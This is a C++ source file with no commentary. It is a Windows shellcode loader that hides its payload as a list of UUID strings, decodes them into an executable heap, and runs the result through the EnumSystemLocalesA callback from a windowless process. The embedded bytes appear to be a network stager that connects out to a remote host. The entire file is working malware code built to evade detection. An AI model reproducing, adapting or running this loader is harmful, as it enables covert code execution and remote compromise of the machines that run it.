#include <Windows.h>
#include <Rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

const char* uuids[] =
{
	"008fe8fc-0000-8960-e531-d2648b52308b",
"528b0c52-3114-0fff-b74a-268b722831c0",
"7c613cac-2c02-c120-cf0d-01c74975ef52",
"8b10528b-3c42-0157-d08b-407885c0744c",
"588bd001-5020-d301-8b48-1885c9743c49",
"018b348b-31d6-31ff-c0c1-cf0dac01c738",
"03f475e0-f87d-7d3b-2475-e0588b582401",
"0c8b66d3-8b4b-1c58-01d3-8b048b01d089",
"5b242444-615b-5a59-51ff-e0585f5a8b12",
"ffff80e9-5dff-3368-3200-00687773325f",
"774c6854-0726-e889-ffd0-b89001000029",
"685054c4-8029-006b-ffd5-6a0a682f644e",
"00026859-1d23-e689-5050-505040504050",
"df0fea68-ffe0-97d5-6a10-56576899a574",
"85d5ff61-74c0-ff0a-4e08-75ece8670000",
"6a006a00-5604-6857-02d9-c85fffd583f8",
"8b367e00-6a36-6840-0010-0000566a0068",
"e553a458-d5ff-5393-6a00-5653576802d9",
"d5ff5fc8-f883-7d00-2858-68004000006a",
"0b685000-0f2f-ff30-d557-68756e4d61ff",
"ff5e5ed5-240c-850f-70ff-ffffe99bffff",
"29c301ff-75c6-c3c1-bbf0-b5a2566a0053",
"0000d5ff-0000-0000-0000-000000000000",

};

int main()
{
	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	void* ha = HeapAlloc(hc, 0, 0x100000);
	DWORD_PTR hptr = (DWORD_PTR)ha;
	int elems = sizeof(uuids) / sizeof(uuids[0]);

	for (int i = 0; i < elems; i++) {
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
		if (status != RPC_S_OK) {
			CloseHandle(ha);
			return -1;
		}
		hptr += 16;
	}
	EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
	CloseHandle(ha);
	return 0;
}